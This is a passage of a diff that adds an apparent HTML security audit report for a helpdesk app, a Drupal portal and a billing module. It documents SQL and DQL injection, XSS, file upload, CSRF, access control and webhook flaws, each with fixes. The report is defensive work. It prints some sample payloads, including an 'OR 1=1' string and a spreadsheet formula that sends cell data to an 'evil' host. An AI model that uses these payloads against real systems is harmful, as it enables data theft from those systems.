+<section><h4>Impact</h4><p>A customer posts <code>&lt;script&gt;</code> in a comment on their own ticket; every staff member who opens the ticket runs it with their session, so the customer acts as staff (admin screens, delete users via <code>DELETE /admin/users/{id}</code> with the page&#39;s CSRF token, read all tickets). Through auth-102 any other customer who opens the ticket is hit too.</p></section>
+<section><h4>Regression test</h4><p>proof: static — no test suite, no <code>vendor/</code>, no PHP on the audit host.</p></section>
+<section><h4>Chained with</h4><ul>
+<li>auth-102</li>
+</ul></section>
+<p class="meta">injection-107 · Injection &amp; SSRF</p>
+</div></details>
+<details class="row sev-high" id="injection-108">
+<summary><span class="sev">high</span><span class="title">SQL injection in Drupal portal ticket list via the <code>cc</code> query parameter</span><span class="chip chip-static">Code reading only</span><span class="loc">portal/web/modules/custom/helpdesk_portal/src/Controller/PortalController.php:20-23</span></summary>
+<div class="body">
+<section><h4>How to fix</h4><p>Use a placeholder: <code>-&gt;query(&#39;SELECT ... WHERE cc_mail = :mail&#39;, [&#39;:mail&#39; =&gt; $mail])</code>, or the select builder with <code>-&gt;condition(&#39;cc_mail&#39;, $mail)</code>.</p></section>
+<section><h4>Evidence</h4><ul>
+<li><strong>File</strong>: <code>portal/web/modules/custom/helpdesk_portal/src/Controller/PortalController.php:20-23</code></li>
+<li><strong>Code</strong>:</li>
+</ul>
+<pre><code>$mail = $request-&gt;query-&gt;get(&#39;cc&#39;, &#39;&#39;);
+$shared = \Drupal::database()
+    -&gt;query(&quot;SELECT id, subject, status, last_reply FROM {helpdesk_ticket} WHERE cc_mail = &#39;&quot; . $mail . &quot;&#39;&quot;)
+    -&gt;fetchAll();</code></pre></section>
+<section><h4>Data flow</h4><ul>
+<li><strong>Source</strong>: <code>?cc=</code> on /portal/tickets (<code>helpdesk_portal.routing.yml:1-7</code>, permission <code>access helpdesk portal</code>)</li>
+<li><strong>Transformations</strong>: none</li>
+<li><strong>Sink</strong>: <code>Connection::query()</code> with a concatenated string (<code>PortalController.php:22</code>)</li>
+<li><strong>Sanitization</strong>: none; Drupal rejects statement delimiters by default, so stacked queries are blocked, but UNION and boolean payloads are not</li>
+<li><strong>Verdict</strong>: VULNERABLE</li>
+</ul></section>
+<section><h4>Impact</h4><p>Any portal user with the customer permission reads any table of the Drupal database through UNION SELECT into the four rendered columns: <code>users_field_data</code> password hashes and e-mails, <code>sessions</code>, every helpdesk ticket. See chain for the reflected-XSS consequence.</p></section>
+<section><h4>Regression test</h4><p>proof: static — no test suite, no Drupal core in the repo, no PHP on the audit host.</p></section>
+<section><h4>Chained with</h4><ul>
+<li>auth-109, injection-111, chain-901</li>
+</ul></section>
+<p class="meta">injection-108 · Injection &amp; SSRF</p>
+</div></details>
+<details class="row sev-high" id="upload-104">
+<summary><span class="sev">high</span><span class="title">Ticket attachments of any type are stored on the public disk under the client&#39;s file name (HTML/SVG served same-origin, unauthenticated access)</span><span class="chip chip-static">Code reading only</span><span class="loc">app/Http/Controllers/AttachmentController.php:14-17</span></summary>
+<div class="body">
+<section><h4>How to fix</h4><p>Validate with an extension/MIME allow-list (<code>mimes:pdf,png,jpg,txt,...</code>), store on a private disk under a generated name (<code>$file-&gt;store(&#39;attachments/&#39;.$ticket-&gt;id, &#39;local&#39;)</code>), keep the original name only in the DB, and serve downloads through an authorized controller with <code>Content-Disposition: attachment</code>.</p></section>
+<section><h4>Evidence</h4><ul>
+<li><strong>File</strong>: <code>app/Http/Controllers/AttachmentController.php:14-17</code></li>
+<li><strong>Code</strong>:</li>
+</ul>
+<pre><code>$request-&gt;validate([&#39;file&#39; =&gt; [&#39;required&#39;, &#39;file&#39;, &#39;max:10240&#39;]]);
+$file = $request-&gt;file(&#39;file&#39;);
+
+$path = $file-&gt;storeAs(&#39;attachments/&#39;.$ticket-&gt;id, $file-&gt;getClientOriginalName(), &#39;public&#39;);</code></pre>
+<ul>
+<li><strong>File</strong>: <code>resources/views/tickets/show.blade.php:12</code> <code>&lt;a href=&quot;{{ Storage::disk(&#39;public&#39;)-&gt;url($file-&gt;path) }}&quot;&gt;{{ $file-&gt;name }}&lt;/a&gt;</code></li>
+</ul></section>
+<section><h4>Data flow</h4><ul>
+<li><strong>Source</strong>: multipart <code>file</code> on POST /tickets/{ticket}/attachments (<code>routes/web.php:23</code>), ticket owner or admin (<code>AttachmentController.php:12</code>)</li>
+<li><strong>Transformations</strong>: only <code>file</code> + <code>max:10240</code> validation; no <code>mimes</code>/extension allow-list; client file name kept (Symfony <code>UploadedFile</code> reduces it to its basename, so no directory traversal)</li>
+<li><strong>Sink</strong>: <code>storage/app/public/attachments/{ticket_id}/{client name}</code>, served by the web server under <code>/storage/...</code> on the application origin</li>
+<li><strong>Sanitization</strong>: none on type or extension</li>
+<li><strong>Verdict</strong>: VULNERABLE</li>
+</ul></section>
+<section><h4>Impact</h4><p>A customer uploads <code>x.html</code> or <code>x.svg</code> with script to their own ticket; when staff open the attachment link from the ticket page the script runs on the helpdesk origin with the staff session (same class of result as the stored comment XSS). The files are also readable by anyone without signing in at a predictable URL (<code>/storage/attachments/&lt;ticket id&gt;/&lt;file name&gt;</code>), and a second upload with the same name overwrites the first. If the web server executes <code>.php</code> under <code>public/</code> (server config is not in the repo) the same upload is remote code execution.</p></section>
+<section><h4>Regression test</h4><p>proof: static — no test suite, no <code>vendor/</code>, no PHP on the audit host.</p></section>
+<section><h4>Chained with</h4><ul>
+<li>auth-102 (discloses the attachment file names of any ticket)</li>
+</ul></section>
+<p class="meta">upload-104 · File upload &amp; storage</p>
+</div></details>
+<h3>medium · 6</h3><details class="row sev-medium" id="auth-105">
+<summary><span class="sev">medium</span><span class="title">CSRF protection disabled for every /account/* route (profile, e-mail, password, avatar)</span><span class="loc">app/Http/Middleware/VerifyCsrfToken.php:14-17</span></summary>
+<div class="body">
+<section><h4>How to fix</h4><p>Remove <code>&#39;account/*&#39;</code> from <code>$except</code>; the forms in Blade already send <code>@csrf</code>. Keep only <code>webhooks/mail</code>.</p></section>
+<section><h4>Evidence</h4><ul>
+<li><strong>File</strong>: <code>app/Http/Middleware/VerifyCsrfToken.php:14-17</code></li>
+<li><strong>Code</strong>:</li>
+</ul>
+<pre><code>protected $except = [
+    &#39;webhooks/mail&#39;,
+    &#39;account/*&#39;,
+];</code></pre>
+<ul>
+<li>Affected routes: <code>routes/web.php:26</code> POST /account/profile, <code>routes/web.php:27</code> POST /account/avatar</li>
+</ul></section>
+<section><h4>Data flow</h4><ul>
+<li><strong>Source</strong>: a cross-origin form POST carrying the victim&#39;s session cookie</li>
+<li><strong>Transformations</strong>: CSRF token check skipped for <code>account/*</code></li>
+<li><strong>Sink</strong>: <code>ProfileController::update</code> → <code>$request-&gt;user()-&gt;update($request-&gt;all())</code> (<code>app/Http/Controllers/ProfileController.php:21</code>)</li>
+<li><strong>Sanitization</strong>: none in code. Laravel 11&#39;s default session cookie is <code>SameSite=Lax</code> (<code>config/session.php</code> is not in the repo, so the framework default is assumed), which stops cross-site POSTs but not same-site ones (sibling subdomains, e.g. the portal if it shares the registrable domain)</li>
+<li><strong>Verdict</strong>: PARTIAL</li>
+</ul></section>
+<section><h4>Impact</h4><p>A page on a same-site origin (or any origin, if the session cookie is configured <code>SameSite=None</code> in deployment) makes a signed-in user&#39;s browser change their e-mail and password (via the mass assignment in auth-103), taking over the account. Assumption: the custom <code>VerifyCsrfToken</code> is the one wired in (<code>bootstrap/app.php</code> is not in the repo; the webhook exception only works if it is).</p></section>
+<section><h4>Regression test</h4><p>Not required (MEDIUM).</p></section>
+<section><h4>Chained with</h4><ul>
+<li>auth-103</li>
+</ul></section>
+<p class="meta">auth-105 · Authentication &amp; authorization</p>
+</div></details>
+<details class="row sev-medium" id="auth-109">
+<summary><span class="sev">medium</span><span class="title">Portal &quot;shared tickets&quot; are selected by a client-chosen e-mail, not the signed-in user&#39;s</span><span class="loc">portal/web/modules/custom/helpdesk_portal/src/Controller/PortalController.php:20-26</span></summary>
+<div class="body">
+<section><h4>How to fix</h4><p>Drop the parameter and use <code>$this-&gt;currentUser()-&gt;getEmail()</code> as a bound value; skip the query when the user has no e-mail.</p></section>
+<section><h4>Evidence</h4><ul>
+<li><strong>File</strong>: <code>portal/web/modules/custom/helpdesk_portal/src/Controller/PortalController.php:20-26</code></li>
+<li><strong>Code</strong>:</li>
+</ul>
+<pre><code>$mail = $request-&gt;query-&gt;get(&#39;cc&#39;, &#39;&#39;);
+$shared = \Drupal::database()
+    -&gt;query(&quot;SELECT id, subject, status, last_reply FROM {helpdesk_ticket} WHERE cc_mail = &#39;&quot; . $mail . &quot;&#39;&quot;)
+    -&gt;fetchAll();
+
+$items = [];
+foreach (array_merge($rows, $shared) as $row) {</code></pre></section>
+<section><h4>Data flow</h4><ul>
+<li><strong>Source</strong>: <code>?cc=</code> (<code>PortalController.php:20</code>)</li>
+<li><strong>Transformations</strong>: none</li>
+<li><strong>Sink</strong>: tickets whose <code>cc_mail</code> equals the supplied address, rendered with <code>last_reply</code> (<code>PortalController.php:26-32</code>)</li>
+<li><strong>Sanitization</strong>: the first query is scoped by <code>uid</code> (<code>:17</code>); the shared query has no relation to the current user</li>
+<li><strong>Verdict</strong>: VULNERABLE</li>
+</ul></section>
+<section><h4>Impact</h4><p>Any portal customer who knows or guesses another person&#39;s e-mail sees the subject, status and last reply of every ticket that person is cc&#39;d on. With no <code>cc</code> the query uses <code>&#39;&#39;</code>; if the schema stores an empty string for tickets without a cc (schema not in the repo, not verified), every user sees all of those. Different class and fix from the SQL injection on the same line (injection-108).</p></section>
+<section><h4>Regression test</h4><p>Not required (MEDIUM).</p></section>
+<section><h4>Chained with</h4><ul>
+<li>injection-108</li>
+</ul></section>
+<p class="meta">auth-109 · Authentication &amp; authorization</p>
+</div></details>
+<details class="row sev-medium" id="auth-114">
+<summary><span class="sev">medium</span><span class="title">Billing invoice search is not scoped to the customer: any customer lists other customers&#39; invoices</span><span class="loc">billing/src/Controller/InvoiceController.php:27-35</span></summary>
+<div class="body">
+<section><h4>How to fix</h4><p>Pass <code>$this-&gt;getUser()</code> and add <code>andWhere(&#39;i.customer = :customer&#39;)</code> in the search query.</p></section>
+<section><h4>Evidence</h4><ul>
+<li><strong>File</strong>: <code>billing/src/Controller/InvoiceController.php:27-35</code></li>
+<li><strong>Code</strong>:</li>
+</ul>
+<pre><code>#[Route(&#39;/search&#39;, name: &#39;invoice_search&#39;, methods: [&#39;GET&#39;])]
+public function search(Request $request, InvoiceRepository $invoices): Response
+{
+    $number = (string) $request-&gt;query-&gt;get(&#39;number&#39;, &#39;&#39;);
+    return $this-&gt;render(&#39;invoice/index.html.twig&#39;, [
+        &#39;invoices&#39; =&gt; $invoices-&gt;searchByNumber($number),
+    ]);
+}</code></pre>
+<ul>
+<li><strong>File</strong>: <code>billing/src/Repository/InvoiceRepository.php:31-37</code> (no customer condition)</li>
+</ul></section>
+<section><h4>Data flow</h4><ul>
+<li><strong>Source</strong>: <code>?number=</code> (any value, default <code>&#39;&#39;</code>), ROLE_USER (<code>InvoiceController.php:14</code>, <code>security.yaml:17</code>)</li>
+<li><strong>Transformations</strong>: none</li>
+<li><strong>Sink</strong>: <code>searchByNumber</code> returns up to 20 invoices of any customer, rendered in <code>invoice/index.html.twig</code></li>
+<li><strong>Sanitization</strong>: none on ownership (compare <code>findForCustomer</code>, <code>InvoiceRepository.php:18-28</code>)</li>
+<li><strong>Verdict</strong>: VULNERABLE</li>
+</ul></section>
+<section><h4>Impact</h4><p>Any signed-in billing customer searches <code>number=</code> with an empty or partial value and sees invoices of other customers (20 per query, paged by varying the pattern): at least each invoice&#39;s number and payment status (the list template is not in the repo; PDFs stay voter-protected). README: &quot;Invoices are visible to their customer only&quot;. Distinct from the DQL injection on the same line (injection-115): different class and fix.</p></section>
+<section><h4>Regression test</h4><p>proof: static — no test suite, no <code>vendor/</code>, no PHP on the audit host.</p></section>
+<section><h4>Chained with</h4><ul>
+<li>injection-115</li>
+</ul></section>
+<p class="meta">auth-114 · Authentication &amp; authorization</p>
+</div></details>
+<details class="row sev-medium" id="auth-116">
+<summary><span class="sev">medium</span><span class="title">Billing invoice page shows any invoice by id (no voter check, unlike the PDF route)</span><span class="loc">billing/src/Controller/InvoiceController.php:37-43</span></summary>
+<div class="body">
+<section><h4>How to fix</h4><p>Add <code>$this-&gt;denyAccessUnlessGranted(&#39;VIEW&#39;, $invoice);</code> after loading.</p></section>
+<section><h4>Evidence</h4><ul>
+<li><strong>File</strong>: <code>billing/src/Controller/InvoiceController.php:37-43</code></li>
+<li><strong>Code</strong>:</li>
+</ul>
+<pre><code>#[Route(&#39;/{id}&#39;, name: &#39;invoice_show&#39;, methods: [&#39;GET&#39;])]
+public function show(int $id, InvoiceRepository $invoices): Response
+{
+    $invoice = $invoices-&gt;find($id) ?? throw $this-&gt;createNotFoundException();
+
+    return $this-&gt;render(&#39;invoice/show.html.twig&#39;, [&#39;invoice&#39; =&gt; $invoice]);
+}</code></pre></section>
+<section><h4>Data flow</h4><ul>
+<li><strong>Source</strong>: <code>{id}</code>, ROLE_USER</li>
+<li><strong>Transformations</strong>: int</li>
+<li><strong>Sink</strong>: <code>invoice/show.html.twig</code> renders number and status (<code>billing/templates/invoice/show.html.twig:4-6</code>)</li>
+<li><strong>Sanitization</strong>: none; <code>pdf()</code> calls <code>denyAccessUnlessGranted(&#39;VIEW&#39;, $invoice)</code> (<code>:48</code>), <code>show()</code> does not</li>
+<li><strong>Verdict</strong>: VULNERABLE</li>
+</ul></section>
+<section><h4>Impact</h4><p>Any signed-in billing customer enumerates invoice ids and reads every other customer&#39;s invoice number and payment status. The PDF itself stays protected by the voter, so the exposed data is limited, hence MEDIUM.</p></section>
+<section><h4>Regression test</h4><p>Not required (MEDIUM).</p></section>
+<section><h4>Chained with</h4><ul>
+<li>none</li>
+</ul></section>
+<p class="meta">auth-116 · Authentication &amp; authorization</p>
+</div></details>
+<details class="row sev-medium" id="injection-111">
+<summary><span class="sev">medium</span><span class="title">Drupal portal renders last_reply through Markup::create, bypassing Drupal&#39;s XSS filter</span><span class="loc">portal/web/modules/custom/helpdesk_portal/src/Controller/PortalController.php:30-32</span></summary>
+<div class="body">
+<section><h4>How to fix</h4><p>Use <code>[&#39;#markup&#39; =&gt; $row-&gt;last_reply, ...]</code> with the default filter, or <code>[&#39;#type&#39; =&gt; &#39;html_tag&#39;, &#39;#tag&#39; =&gt; &#39;blockquote&#39;, &#39;#value&#39; =&gt; $row-&gt;last_reply]</code> / <code>#plain_text</code>.</p></section>
+<section><h4>Evidence</h4><ul>
+<li><strong>File</strong>: <code>portal/web/modules/custom/helpdesk_portal/src/Controller/PortalController.php:30-32</code></li>
+<li><strong>Code</strong>:</li>
+</ul>
+<pre><code>if ($row-&gt;last_reply) {
+    $items[] = [&#39;#markup&#39; =&gt; Markup::create(&#39;&lt;blockquote&gt;&#39; . $row-&gt;last_reply . &#39;&lt;/blockquote&gt;&#39;)];
+}</code></pre></section>
+<section><h4>Data flow</h4><ul>
+<li><strong>Source</strong>: <code>helpdesk_ticket.last_reply</code> (written outside this repo; the helpdesk stores comment bodies unsanitised, see injection-107) and any row injected via injection-108</li>
+<li><strong>Transformations</strong>: concatenated into HTML</li>
+<li><strong>Sink</strong>: <code>Markup::create</code> marks the string safe, so the renderer does not apply <code>Xss::filterAdmin</code> to <code>#markup</code></li>
+<li><strong>Sanitization</strong>: none</li>
+<li><strong>Verdict</strong>: VULNERABLE</li>
+</ul></section>
+<section><h4>Impact</h4><p>Whoever controls a ticket&#39;s last reply text (the customer or a staff member writing a reply, if the sync copies the comment body as-is; the writer is not in the repo) runs script in the portal for every user who views that ticket in their list. Severity limited to MEDIUM because the writer of <code>last_reply</code> is not visible in this codebase; the reflected variant is chain-901.</p></section>
+<section><h4>Regression test</h4><p>Not required (MEDIUM).</p></section>
+<section><h4>Chained with</h4><ul>
+<li>injection-108, chain-901</li>
+</ul></section>
+<p class="meta">injection-111 · Injection &amp; SSRF</p>
+</div></details>
+<details class="row sev-medium" id="injection-115">
+<summary><span class="sev">medium</span><span class="title">DQL injection in billing invoice search (<code>number</code> concatenated into the query)</span><span class="loc">billing/src/Repository/InvoiceRepository.php:31-37</span></summary>
+<div class="body">
+<section><h4>How to fix</h4><p><code>-&gt;createQuery(&#39;SELECT i FROM App\Entity\Invoice i WHERE i.number LIKE :n AND i.customer = :c&#39;)-&gt;setParameter(&#39;n&#39;, &#39;%&#39;.addcslashes($number, &#39;%_&#39;).&#39;%&#39;)</code>.</p></section>
+<section><h4>Evidence</h4><ul>
+<li><strong>File</strong>: <code>billing/src/Repository/InvoiceRepository.php:31-37</code></li>
+<li><strong>Code</strong>:</li>
+</ul>
+<pre><code>public function searchByNumber(string $number): array
+{
+    return $this-&gt;getEntityManager()
+        -&gt;createQuery(&quot;SELECT i FROM App\Entity\Invoice i WHERE i.number LIKE &#39;%&quot;.$number.&quot;%&#39;&quot;)
+        -&gt;setMaxResults(20)
+        -&gt;getResult();
+}</code></pre></section>
+<section><h4>Data flow</h4><ul>
+<li><strong>Source</strong>: <code>?number=</code> on GET /invoices/search (<code>InvoiceController.php:30</code>), ROLE_USER</li>
+<li><strong>Transformations</strong>: cast to string</li>
+<li><strong>Sink</strong>: DQL string (<code>InvoiceRepository.php:34</code>)</li>
+<li><strong>Sanitization</strong>: none</li>
+<li><strong>Verdict</strong>: VULNERABLE</li>
+</ul></section>
+<section><h4>Impact</h4><p>A signed-in customer alters the DQL WHERE clause (<code>&#39; OR 1=1 OR i.number LIKE &#39;</code>) and, with subqueries over mapped entities, reads other entities field by field (e.g. <code>Customer</code> e-mails and roles) by boolean inference. DQL cannot reach unmapped tables or stack statements, hence MEDIUM.</p></section>
+<section><h4>Regression test</h4><p>Not required (MEDIUM).</p></section>
+<section><h4>Chained with</h4><ul>
+<li>auth-114</li>
+</ul></section>
+<p class="meta">injection-115 · Injection &amp; SSRF</p>
+</div></details>
+<h3>low · 3</h3><details class="row sev-low" id="auth-113">
+<summary><span class="sev">low</span><span class="title">Portal &quot;close ticket&quot; changes state on GET without a CSRF token</span><span class="loc">portal/web/modules/custom/helpdesk_portal/helpdesk_portal.routing.yml:17-23</span></summary>
+<div class="body">
+<section><h4>How to fix</h4><p>Add <code>_csrf_token: &#39;TRUE&#39;</code> (and build links with <code>Url::fromRoute</code>), or make it a POST form.</p></section>
+<section><h4>Evidence</h4><ul>
+<li><strong>File</strong>: <code>portal/web/modules/custom/helpdesk_portal/helpdesk_portal.routing.yml:17-23</code></li>
+<li><strong>Code</strong>:</li>
+</ul>
+<pre><code>helpdesk_portal.close:
+  path: &#39;/portal/tickets/{ticket_id}/close&#39;
+  ...
+  requirements:
+    _permission: &#39;access helpdesk portal&#39;
+    ticket_id: &#39;\d+&#39;</code></pre>
+<p>(<code>helpdesk_portal.reopen</code> at <code>:25-32</code> has <code>_csrf_token: &#39;TRUE&#39;</code>, close does not)</p></section>
+<section><h4>Data flow</h4><ul>
+<li><strong>Source</strong>: a link or redirect to /portal/tickets/{id}/close opened by a signed-in customer</li>
+<li><strong>Transformations</strong>: none</li>
+<li><strong>Sink</strong>: <code>setStatus($ticket_id, &#39;closed&#39;)</code> (<code>PortalController.php:47-52, 66-72</code>)</li>
+<li><strong>Sanitization</strong>: update scoped to the current user&#39;s <code>uid</code> (<code>:71</code>); no CSRF token</li>
+<li><strong>Verdict</strong>: VULNERABLE</li>
+</ul></section>
+<section><h4>Impact</h4><p>An attacker who gets a customer to follow a link (top-level GET navigation carries Lax cookies) closes that customer&#39;s own tickets. Only the victim&#39;s own tickets, only status, hence LOW.</p></section>
+<section><h4>Regression test</h4><p>Not required (LOW).</p></section>
+<section><h4>Chained with</h4><ul>
+<li>none</li>
+</ul></section>
+<p class="meta">auth-113 · Authentication &amp; authorization</p>
+</div></details>
+<details class="row sev-low" id="crypto-117">
+<summary><span class="sev">low</span><span class="title">Mail webhook signature check fails open when MAIL_WEBHOOK_SECRET is empty or unset</span><span class="loc">app/Http/Controllers/MailWebhookController.php:12-18</span></summary>
+<div class="body">
+<section><h4>How to fix</h4><p><code>abort_if(blank(config(&#39;services.mail.webhook_secret&#39;)), 500)</code> before computing the HMAC, require a non-empty string <code>token</code>, and add the provider&#39;s timestamp to the signed payload with a short tolerance.</p></section>
+<section><h4>Evidence</h4><ul>
+<li><strong>File</strong>: <code>app/Http/Controllers/MailWebhookController.php:12-18</code></li>
+<li><strong>Code</strong>:</li>
+</ul>
+<pre><code>$expected = hash_hmac(&#39;sha256&#39;, $request-&gt;getContent(), config(&#39;services.mail.webhook_secret&#39;));
+
+if (! hash_equals($expected, (string) $request-&gt;header(&#39;X-Mail-Signature&#39;))) {
+    abort(401);
+}
+
+$ticket = Ticket::where(&#39;reply_token&#39;, $request-&gt;input(&#39;token&#39;))-&gt;firstOrFail();</code></pre>
+<ul>
+<li><strong>File</strong>: <code>.env.example:13</code> <code>MAIL_WEBHOOK_SECRET=</code> (empty)</li>
+</ul></section>
+<section><h4>Data flow</h4><ul>
+<li><strong>Source</strong>: anonymous POST /webhooks/mail (<code>routes/web.php:14</code>, CSRF-exempt)</li>
+<li><strong>Transformations</strong>: HMAC over the raw body with the configured key</li>
+<li><strong>Sink</strong>: comment created on the ticket matching <code>reply_token</code>, as the ticket owner (<code>:18-22</code>)</li>
+<li><strong>Sanitization</strong>: <code>hash_equals</code> (constant time, correct); no check that the secret is non-empty, no timestamp/replay window</li>
+<li><strong>Verdict</strong>: PARTIAL</li>
+</ul></section>
+<section><h4>Impact</h4><p>If the deployment leaves the secret empty (as <code>.env.example</code> ships it), anyone computes a valid HMAC with an empty key and posts comments as the owner of any ticket whose <code>reply_token</code> they know; with <code>token</code> omitted Laravel turns <code>where(&#39;reply_token&#39;, null)</code> into <code>IS NULL</code>, matching any ticket without a token (schema not in repo). One configuration mistake required, hence LOW.</p></section>
+<section><h4>Regression test</h4><p>Not required (LOW).</p></section>
+<section><h4>Chained with</h4><ul>
+<li>none</li>
+</ul></section>
+<p class="meta">crypto-117 · Cryptography</p>
+</div></details>
+<details class="row sev-low" id="injection-110">
+<summary><span class="sev">low</span><span class="title">CSV/formula injection in the ticket export (subject not neutralised)</span><span class="loc">app/Http/Controllers/ReportController.php:27-32</span></summary>
+<div class="body">
+<section><h4>How to fix</h4><p>Build the CSV with <code>fputcsv</code> (proper quoting) and prefix cells starting with <code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>, tab or CR with a <code>&#39;</code>.</p></section>
+<section><h4>Evidence</h4><ul>
+<li><strong>File</strong>: <code>app/Http/Controllers/ReportController.php:27-32</code></li>
+<li><strong>Code</strong>:</li>
+</ul>
+<pre><code>$csv = $tickets-&gt;map(fn ($t) =&gt; implode(&#39;,&#39;, [
+    $t-&gt;id,
+    $t-&gt;status,
+    $t-&gt;user-&gt;email,
+    str_replace(&#39;,&#39;, &#39; &#39;, $t-&gt;subject),
+]))-&gt;prepend(&#39;id,status,email,subject&#39;)-&gt;implode(&quot;\n&quot;);</code></pre></section>
+<section><h4>Data flow</h4><ul>
+<li><strong>Source</strong>: ticket <code>subject</code>, set by any customer (<code>StoreTicketRequest.php:12</code>)</li>
+<li><strong>Transformations</strong>: commas replaced with spaces only; quotes, newlines and leading <code>=</code>,<code>+</code>,<code>-</code>,<code>@</code> kept</li>
+<li><strong>Sink</strong>: CSV download opened by staff in a spreadsheet</li>
+<li><strong>Sanitization</strong>: none against formulas</li>
+<li><strong>Verdict</strong>: VULNERABLE</li>
+</ul></section>
+<section><h4>Impact</h4><p>A customer titles a ticket <code>=HYPERLINK(&quot;https://evil/?&quot;&amp;C2,&quot;click&quot;)</code> or similar; when staff open the export in Excel/Sheets the formula runs (data exfiltration via links, DDE prompts in old Excel). Needs a staff click, hence LOW.</p></section>
+<section><h4>Regression test</h4><p>Not required (LOW).</p></section>
+<section><h4>Chained with</h4><ul>
+<li>auth-101</li>
+</ul></section>
+<p class="meta">injection-110 · Injection &amp; SSRF</p>
+</div></details>
+
+
+
+
+<h2 id="safe">Verified safe</h2>
+<p class="lede">Areas the audit examined and found protected, each with the control that protects it.</p>
+<div class="band-safe"><details class="cat" open><summary>Authentication &amp; authorization <span>7</span></summary><ul class="good"><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="9" cy="9" r="7.2"/><path d="M5.8 9.2l2.2 2.2 4.2-4.6"/></svg><div>Mobile API ticket access (GET /api/tickets, GET /api/tickets/{ticket})<span class="why">Both routes sit in <code>auth:sanctum</code>; the list is built from the token owner&#39;s relation and <code>show</code> returns 404 unless the ticket belongs to the token owner. · <code>routes/api.php:7-10</code></span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="9" cy="9" r="7.2"/><path d="M5.8 9.2l2.2 2.2 4.2-4.6"/></svg><div>Ticket update, comment and attachment writes (PUT /tickets/{ticket}, POST /tickets/{ticket}/comments, POST /tickets/{ticket}/attachments)<span class="why">Each handler calls <code>authorize(&#39;update&#39;, $ticket)</code>; <code>TicketPolicy::update</code> (auto-discovered by Laravel naming convention) allows only the owner or an admin. Update writes only validated <code>subject</code>/<code>priority</code>; comment <code>user_id</code> comes from the session. · <code>app/Policies/TicketPolicy.php:12</code></span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="9" cy="9" r="7.2"/><path d="M5.8 9.2l2.2 2.2 4.2-4.6"/></svg><div>Ticket creation (POST /tickets) and owner assignment<span class="why">Only the three validated fields are written and <code>user_id</code> is taken from the session; <code>Ticket::$fillable</code> includes <code>user_id</code> but the request cannot supply it because <code>validated()</code> drops unknown fields and the session value is added last. · <code>app/Http/Controllers/TicketController.php:25</code></span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="9" cy="9" r="7.2"/><path d="M5.8 9.2l2.2 2.2 4.2-4.6"/></svg><div>Admin screens (users list, delete user, ticket report)<span class="why">The whole prefix group requires <code>auth</code> and <code>can:admin</code>; the gate checks <code>is_admin</code>. (Privilege escalation to <code>is_admin</code> is auth-103, a separate defect.) · <code>routes/web.php:30-34</code></span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="9" cy="9" r="7.2"/><path d="M5.8 9.2l2.2 2.2 4.2-4.6"/></svg><div>Billing invoice list and invoice PDF download<span class="why">The list is filtered by the signed-in customer with bound parameters; the PDF route calls the <code>VIEW</code> voter, which compares the invoice&#39;s customer with the token user (if no voter is registered, Symfony denies by default because all voters abstain). The PDF path comes from the DB, not the request. · <code>billing/src/Repository/InvoiceRepository.php:20-24</code></span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="9" cy="9" r="7.2"/><path d="M5.8 9.2l2.2 2.2 4.2-4.6"/></svg><div>Portal close/reopen authorization and own-ticket list<span class="why"><code>setStatus</code> restricts the update to rows owned by the current Drupal uid, so a customer cannot change another customer&#39;s ticket; reopen also has <code>_csrf_token</code>. The own-ticket query uses a bound <code>:uid</code>. (Missing CSRF on close is auth-113.) · <code>portal/web/modules/custom/helpdesk_portal/src/Controller/PortalController.php:68-72</code></span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="9" cy="9" r="7.2"/><path d="M5.8 9.2l2.2 2.2 4.2-4.6"/></svg><div>Admin handlers reachable outside the admin group (sibling check for auth-101): other routes or prefixes pointing at <code>Admin\UserController</code> or <code>ReportController::tickets</code><span class="why"><code>Admin\UserController</code> and <code>ReportController::tickets</code> are registered only inside the <code>auth</code> + <code>can:admin</code> group; the only other route to <code>ReportController</code> is <code>export</code>, which is auth-101. Billing has no admin controllers; its <code>^/admin</code> access_control rule requires ROLE_ADMIN. · <code>routes/web.php:30-34</code></span></div></li></ul></details><details class="cat" open><summary>Injection &amp; SSRF <span>4</span></summary><ul class="good"><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="9" cy="9" r="7.2"/><path d="M5.8 9.2l2.2 2.2 4.2-4.6"/></svg><div>Admin ticket report date filter (whereRaw)<span class="why">The raw fragment is constant and the date is passed as a binding; <code>$request-&gt;date()</code> parses to Carbon or null. · <code>app/Http/Controllers/ReportController.php:12-16</code></span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="9" cy="9" r="7.2"/><path d="M5.8 9.2l2.2 2.2 4.2-4.6"/></svg><div>Output escaping of ticket body, subject and attachment names (Blade), portal list items, billing invoice page (Twig)<span class="why">The ticket body is escaped with <code>e()</code> before <code>nl2br</code>; other Blade output uses <code>{{ }}</code>; the portal list uses <code>$this-&gt;t()</code> with <code>@</code> placeholders (escaped); Twig autoescapes <code>invoice.number</code>/<code>status</code>. (Comment bodies and <code>last_reply</code> are findings injection-107 and injection-111.) · <code>resources/views/tickets/show.blade.php:8</code></span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" 